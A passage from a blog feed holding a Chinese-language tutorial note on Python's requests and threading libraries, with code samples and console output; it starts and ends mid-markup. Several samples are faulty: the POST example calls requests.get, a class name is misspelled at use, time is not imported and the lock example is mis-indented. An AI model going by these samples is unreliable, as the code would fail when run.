        &lt;h3 id=&quot;font-color-navy0x00-什么是多线程font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-什么是多线程font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;0x00 什么是
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python库总结</title>
    <link href="https://muzibing.github.io/2020/09/04/2020.09.04%EF%BC%88148%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/04/2020.09.04（148）/</id>
    <published>2020-09-03T16:00:00.000Z</published>
    <updated>2020-11-18T13:18:47.189Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-导入库的的方式"><a href="#0x00-导入库的的方式" class="headerlink" title="0x00 导入库的的方式"></a><font color="navy">0x00 导入库的的方式</font></h3><h4 id="1-import-module"><a href="#1-import-module" class="headerlink" title="1.import module"></a>1.import module</h4><p><code>核心笔记</code></p><blockquote><p>import语句的模块顺序：最好按照如下顺序：</p><ul><li>Python标准库模块</li><li>Python第三方库文件</li><li>应用程序自定义模块</li></ul></blockquote><p><code>使用函数</code></p><blockquote><p>module.function()</p></blockquote><h4 id="2-from-module-import"><a href="#2-from-module-import" class="headerlink" title="2.from module import *"></a>2.from module import *</h4><p><code>使用方法</code></p><blockquote><p>function()</p></blockquote><p><code>核心笔记</code></p><blockquote><p>在实践中，认为“import module import *”不是很好的编程风格，因为它“污染”当前名称空间，而且很可能覆盖当前名称空间中现有的名字；但如果某个模块有很多要经常访问的变量或者模块的名字很长，这也不失为一个好办法</p></blockquote><h3 id="0x01-requests-库"><a href="#0x01-requests-库" class="headerlink" title="0x01 requests 库"></a><font color="navy">0x01 requests 库</font></h3><blockquote><p><a href="https://requests.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">相关链接</a></p></blockquote><h4 id="1-发送请求"><a href="#1-发送请求" class="headerlink" title="1.发送请求"></a>1.发送请求</h4><p><code>get 请求</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 头部信息</span></span><br><span class="line">header = &#123;</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'*/*'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'http://www.baidu.com'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; '</span>,</span><br><span class="line">            <span class="string">'Cache-Control'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数信息</span></span><br><span class="line">para = &#123;</span><br><span class="line">    <span class="string">'key1'</span>: <span class="string">'value1'</span>, </span><br><span class="line">    <span class="string">'key2'</span>: <span class="string">'value2'</span>, </span><br><span class="line">    <span class="string">'key3'</span>: <span class="keyword">None</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># cookies</span></span><br><span class="line">cookies = dict(cookies_are=<span class="string">'working'</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, headers=header, params = para, allow_redirects=<span class="keyword">False</span>, cookies=cookies, timeout=<span class="number">60</span>)</span><br></pre></td></tr></table></figure><p><code>post 请求</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 除了参数信息的方式不一样外，其余信息和get一样</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 头部信息</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">'key1'</span>: <span class="string">'value1'</span>, </span><br><span class="line">    <span class="string">'key2'</span>: <span class="string">'value2'</span>, </span><br><span class="line">    <span class="string">'key3'</span>: <span class="keyword">None</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url, data=header, params = para, allow_redirects=<span class="keyword">False</span>, timeout=<span class="number">60</span>)</span><br></pre></td></tr></table></figure><p><code>请求的参数</code></p><p><strong>① 参数</strong></p><blockquote><p>具体的可以看上面</p></blockquote><p><strong>② Cookies</strong></p><blockquote><p>如果某个响应中包含一些 cookie，你可以快速访问它们：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://example.com/some/cookie/setting/url'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.cookies[<span class="string">'example_cookie_name'</span>]</span><br><span class="line"><span class="string">'example_cookie_value'</span></span><br></pre></td></tr></table></figure><blockquote><p>要想发送你的cookies到服务器，可以使用 <code>cookies</code> 参数：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/cookies'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cookies = dict(cookies_are=<span class="string">'working'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url, cookies=cookies)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line"><span class="string">'&#123;"cookies": &#123;"cookies_are": "working"&#125;&#125;'</span></span><br></pre></td></tr></table></figure><p><strong>③ 重定向</strong></p><blockquote><p>默认情况下，除了 HEAD, Requests 会自动处理所有重定向。</p><p>可以使用响应对象的 <code>history</code> 方法来追踪重定向。</p><p><a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Response.history" target="_blank" rel="noopener"><code>Response.history</code></a> 是一个 <a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Response" target="_blank" rel="noopener"><code>Response</code></a> 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。</p></blockquote><p>例如，Github 将所有的 HTTP 请求重定向到 HTTPS：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://github.com'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.url</span><br><span class="line"><span class="string">'https://github.com/'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</span><br><span class="line">[&lt;Response [<span class="number">301</span>]&gt;]</span><br></pre></td></tr></table></figure><p>如果你使用的是GET、OPTIONS、POST、PUT、PATCH 或者 DELETE，那么你可以通过 <code>allow_redirects</code> 参数禁用重定向处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://github.com'</span>, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">301</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><p><strong>④ 超时</strong></p><p>你可以告诉 requests 在经过以 <code>timeout</code> 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，你的程序可能会永远失去响应：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://github.com'</span>, timeout=<span class="number">0.001</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">requests.exceptions.Timeout: HTTPConnectionPool(host=<span class="string">'github.com'</span>, port=<span class="number">80</span>): Request timed out. (timeout=<span class="number">0.001</span>)</span><br></pre></td></tr></table></figure><font size="2">注意：`timeout` 仅对连接过程有效，与响应体的下载无关。 `timeout` 并不是整个下载响应的时间限制，而是如果服务器在 `timeout` 秒内没有应答，将会引发一个异常（更精确地说，是在 `timeout` 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out.</font><h4 id="2-requests库主要的7个方法"><a href="#2-requests库主要的7个方法" class="headerlink" title="2.requests库主要的7个方法"></a>2.requests库主要的7个方法</h4><div class="table-container"><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>requests.request()</td><td>构造一个请求，支撑一下各方法的基础方法</td></tr><tr><td>requests.get()</td><td>获取HTML网页的主要方法，对应HTTP的GET</td></tr><tr><td>requests.post()</td><td>向HTML网页提交POST请求方法，对应HTTP的POST</td></tr><tr><td>requests.put()</td><td>向HTML网页提交PUT请求的方法，对应HTTP的RUT</td></tr><tr><td>requests.head()</td><td>获取HTML网页头的信息方法，对应HTTP的HEAD</td></tr><tr><td>requests.patch()</td><td>向HTML网页提交局部修改请求，对应于HTTP的PATCH</td></tr><tr><td>requests.delete()</td><td>向HTML页面提交删除请求,对应HTTP的DELETE</td></tr></tbody></table></div><h4 id="3-response对象的属性"><a href="#3-response对象的属性" class="headerlink" title="3.response对象的属性"></a>3.response对象的属性</h4><div class="table-container"><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>r.status_code</td><td>HTTP请求的返回状态</td></tr><tr><td>r.text</td><td>HTTP响应内容的字符串形式，即：url对应的页面内容</td></tr><tr><td>r.encoding</td><td>从HTTP  header中猜测的响应内容编码方式</td></tr><tr><td>r.apparent_encoding</td><td>从内容中分析出的响应内容编码方式（备选编码方式）</td></tr><tr><td>r.content</td><td>HTTP响应内容的二进制形式</td></tr><tr><td>r.headers</td><td>获得头部信息</td></tr><tr><td>r.url</td><td>获得链接</td></tr></tbody></table></div><h3 id="0x02-threading-库（多线程）"><a href="#0x02-threading-库（多线程）" class="headerlink" title="0x02 threading 库（多线程）"></a><font color="navy">0x02 threading 库（多线程）</font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br></pre></td></tr></table></figure><blockquote><p>我们要创建 Thread 对象,然后让它们运行，每个 Thread 对象代表一个线程，在每个线程中我们可以让程序处理不同的任务，这就是多线程编程。</p><p><strong>值得注意的是，程序运行时默认就是在主线程上</strong></p><p>创建 Thread 对象有 2 种手段。</p><ol><li>直接创建 Thread ，将一个 callable 对象从类的构造器传递进去，这个 callable 就是回调函数，用来处理任务。</li><li>编写一个自定义类继承 Thread，然后复写 run() 方法，在 run() 方法中编写任务处理代码，然后创建这个 Thread 的子类。</li></ol></blockquote><h4 id="1-创建-Thread-对象"><a href="#1-创建-Thread-对象" class="headerlink" title="1.创建 Thread 对象"></a>1.创建 Thread 对象</h4><p><code>方法一：直接创建</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">threading</span>.<span class="title">Thread</span><span class="params">(group=None, target=None, name=None, args=<span class="params">()</span>, kwargs=&#123;&#125;, *, daemon=None)</span></span></span><br></pre></td></tr></table></figure><blockquote><ul><li><strong>group</strong> 应该为 <code>None</code>；为了日后扩展 <code>ThreadGroup</code> 类实现而保留。</li><li><strong>target</strong> 是用于 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.run" target="_blank" rel="noopener"><code>run()</code></a> 方法调用的可调用对象。默认是 <code>None</code>，表示不需要调用任何方法。</li><li><strong>name</strong> 是线程名称。默认情况下，由 “Thread-<em>N</em>“ 格式构成一个唯一的名称，其中 <em>N</em> 是小的十进制数。</li><li><strong>args</strong> 是用于调用目标函数的参数元组。默认是 <code>()</code>。</li><li><strong>kwargs</strong> 是用于调用目标函数的关键字参数字典。默认是 <code>{}</code>。</li><li>如果不是 <code>None</code>，<em>daemon</em> 参数将显式地设置该线程是否为守护模式。 如果是 <code>None</code> (默认值)，线程将继承当前线程的守护模式属性。</li><li>如果子类型重载了构造函数，它一定要确保在做任何事前，先发起调用基类构造器(<code>Thread.__init__()</code>)。</li></ul></blockquote><p><code>方法二：继承Thread类创建线程类</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,scan)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.scan = scan</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(threading.current_thread().name,<span class="string">"is created!"</span>)</span><br><span class="line">        self.scan._scan()</span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scan</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,a)</span>:</span></span><br><span class="line">        self.a = a</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_scan</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.a):</span><br><span class="line">            print(threading.current_thread().name, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    scan = Scan(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        <span class="comment">#t = threading.Thread(target=scan._scan,daemon=True)    </span></span><br><span class="line">        t = mythread(scan)</span><br><span class="line">        t.start()</span><br><span class="line">        time.sleep(<span class="number">0.001</span>)</span><br><span class="line">    t.join()</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    while True:</span></span><br><span class="line"><span class="string">        if threading.active_count() &lt;= 1:</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(<span class="string">"The main thread is killed!"</span>)</span><br></pre></td></tr></table></figure><h4 id="2-threading-Thread-的方法"><a href="#2-threading-Thread-的方法" class="headerlink" title="2.threading.Thread 的方法"></a>2.threading.Thread 的方法</h4><blockquote><p>先说几个最常用的，以后再进行补充</p></blockquote><p>① <code>threading.active_count</code>() / <code>threading.activeCount</code>()</p><p>返回当前存活的线程类 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread" target="_blank" rel="noopener"><code>Thread</code></a> 对象。返回的计数等于 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.enumerate" target="_blank" rel="noopener"><code>enumerate()</code></a> 返回的列表长度。</p><p>② <code>threading.current_thread</code>() / <code>threading.currentThread</code>()</p><p>返回当前对应调用者的控制线程的 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread" target="_blank" rel="noopener"><code>Thread</code></a> 对象。如果调用者的控制线程不是利用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#module-threading" target="_blank" rel="noopener"><code>threading</code></a> 创建，会返回一个功能受限的虚拟线程对象。其还可以调用几个实例化方法：</p><ul><li>isAlive(): 返回线程是否活动的</li><li>getName(): 返回线程名</li><li>setName(): 设置线程名</li><li>name(): 返回当前线程的名称</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">threading.current_thread().setName(<span class="string">"主线程"</span>) <span class="comment">#设置线程名字</span></span><br><span class="line">print(threading.current_thread().isAlive()) <span class="comment">#线程是不是活动的</span></span><br><span class="line">print(<span class="string">"当前线程"</span>,threading.current_thread())</span><br><span class="line">print(<span class="string">"获取当前线程名字"</span>,threading.current_thread().getName()</span><br></pre></td></tr></table></figure><p>③ <code>start</code>()</p><blockquote><p>开始线程活动。它在一个线程里最多只能被调用一次。它安排对象的 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.run" target="_blank" rel="noopener"><code>run()</code></a> 方法在一个独立的控制进程中调用。如果同一个线程对象中调用这个方法的次数大于一次，会抛出 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 。</p></blockquote><p>④ <code>run</code>()</p><blockquote><p>代表线程活动的方法。你可以在子类型里重载这个方法。 标准的 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.run" target="_blank" rel="noopener"><code>run()</code></a> 方法会对作为 <em>target</em> 参数传递给该对象构造器的可调用对象（如果存在）发起调用，并附带从 <em>args</em> 和 <em>kwargs</em> 参数分别获取的位置和关键字参数。</p></blockquote><p>⑤ <code>join</code>(timeout=None)`</p><blockquote><ul><li><p>等待，直到线程终结。这会阻塞调用这个方法的线程，直到被调用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 的线程终结 — 不管是正常终结还是抛出未处理异常 — 或者直到发生超时，超时选项是可选的。</p></li><li><p>当 <em>timeout</em> 参数存在而且不是 <code>None</code> 时，它应该是一个用于指定操作超时的以秒为单位的浮点数或者分数。因为 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 总是返回 <code>None</code> ，所以你一定要在 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 后调用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.is_alive" target="_blank" rel="noopener"><code>is_alive()</code></a> 才能判断是否发生超时 — 如果线程仍然存活，则 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 超时。</p></li><li><p>当 <em>timeout</em> 参数不存在或者是 <code>None</code> ，这个操作会阻塞直到线程终结。</p></li><li><p>一个线程可以被 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 很多次。</p></li><li><p>如果尝试加入当前线程会导致死锁， <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 会引起 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 异常。如果尝试 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 一个尚未开始的线程，也会抛出相同的异常。</p></li></ul></blockquote><p>⑥ <code>daemon</code></p><blockquote><p>一个表示这个线程是（True）否（False）守护线程的布尔值。一定要在调用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.start" target="_blank" rel="noopener"><code>start()</code></a> 前设置好，不然会抛出 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 。初始值继承于创建线程；主线程不是守护线程，因此主线程创建的所有线程默认都是 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.daemon" target="_blank" rel="noopener"><code>daemon</code></a> = <code>False</code>。下面先看一段代码：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        print(threading.current_thread().name+<span class="string">' test '</span>,i)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">thread = threading.Thread(target=test,name=<span class="string">'TestThread'</span>)</span><br><span class="line"><span class="comment"># thread = threading.Thread(target=test,name='TestThread',daemon=True)</span></span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    print(threading.current_thread().name+<span class="string">' main '</span>, i)</span><br><span class="line">    print(thread.name+<span class="string">' is alive '</span>, thread.isAlive())</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>程序运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">TestThread test  0</span><br><span class="line">MainThread main  0</span><br><span class="line">TestThread is alive  True</span><br><span class="line">MainThread main  1</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  1</span><br><span class="line">MainThread main  2</span><br><span class="line">TestThread is alive  True</span><br><span class="line">MainThread main  3</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  2</span><br><span class="line">MainThread main  4</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  3</span><br><span class="line">TestThread test  4</span><br></pre></td></tr></table></figure><font size="2">MainThread 没有代码运行的时候，TestThread 还在运行。这是因为 MainThread 在等待其他线程的结束。TestThread 中 daemon 属性默认是 False，这使得 MainThread 需要等待它的结束，自身才结束。**如果要达到，MainThread 结束，子线程也立马结束，怎么做呢？**其实很简单，只需要在子线程调用 start() 方法之前设置 daemon 就好了。当然也可以在子线程的构造器中传递 daemon 的值为 True。</font><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thread = threading.Thread(target=test,name=<span class="string">'TestThread'</span>,daemon=<span class="keyword">True</span>)</span><br><span class="line"><span class="comment"># thread.setDaemon(True)</span></span><br></pre></td></tr></table></figure><h4 id="3-threading锁问题"><a href="#3-threading锁问题" class="headerlink" title="3.threading锁问题"></a>3.threading锁问题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.lock = threading.RLock()</span><br></pre></td></tr></table></figure><p>其方法有：</p><ul><li><p><code>acquire</code>(<em>blocking=True</em>, <em>timeout=-1</em>)</p><p>可以阻塞或非阻塞地获得锁。当无参数调用时： 如果这个线程已经拥有锁，递归级别增加一，并立即返回。否则，如果其他线程拥有该锁，则阻塞至该锁解锁。一旦锁被解锁(不属于任何线程)，则抢夺所有权，设置递归等级为一，并返回。如果多个线程被阻塞，等待锁被解锁，一次只有一个线程能抢到锁的所有权。在这种情况下，没有返回值。当发起调用时将 <em>blocking</em> 参数设为真值，则执行与无参数调用时一样的操作，然后返回 <code>True</code>。当发起调用时将 <em>blocking</em> 参数设为假值，则不进行阻塞。 如果一个无参数调用将要阻塞，则立即返回 <code>False</code>；在其他情况下，执行与无参数调用时一样的操作，然后返回 <code>True</code>。当发起调用时将浮点数的 <em>timeout</em> 参数设为正值时，只要无法获得锁，将最多阻塞 <em>timeout</em> 所指定的秒数。 如果已经获得锁则返回 <code>True</code>，如果超时则返回假值。<em>在 3.2 版更改:</em> 新的 <em>timeout</em> 形参。</p></li><li><p><code>release</code>()</p><p>释放锁，自减递归等级。如果减到零，则将锁重置为非锁定状态(不被任何线程拥有)，并且，如果其他线程正被阻塞着等待锁被解锁，则仅允许其中一个线程继续。如果自减后，递归等级仍然不是零，则锁保持锁定，仍由调用线程拥有。只有当前线程拥有锁才能调用这个方法。如果锁被释放后调用这个方法，会引起 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 异常。没有返回值。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_writeReult</span><span class="params">(self, result)</span>:</span></span><br><span class="line">    self.lock.acquire()<span class="comment"># 获取锁</span></span><br><span class="line">    <span class="keyword">with</span> open(self.oFileName, <span class="string">"a+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(result + <span class="string">"\n"</span>)<span class="comment"># 写入文件</span></span><br><span class="line"> self.lock.release()<span class="comment"># 释放锁</span></span><br></pre></td></tr></table></figure><h4 id="4-thread继承问题"><a href="#4-thread继承问题" class="headerlink" title="4.thread继承问题"></a>4.thread继承问题</h4><p>前面讲过，直接初始化一个 Thread，然后，现在还有一种方式就是自定义一个 Thread 的子类，然后复写它的 run() 方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name=None)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self,name=name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">            print(threading.current_thread().name + <span class="string">' test '</span>, i)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">thread = TestThread(name=<span class="string">'TestThread'</span>)</span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    print(threading.current_thread().name+<span class="string">' main '</span>, i)</span><br><span class="line">    print(thread.name+<span class="string">' is alive '</span>, thread.isAlive())</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>上面的代码，我们自定义了 TestThread 这个类，然后继承了 threading.Thread。</p><p>只有在 run() 方法中处理逻辑。最终代码运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 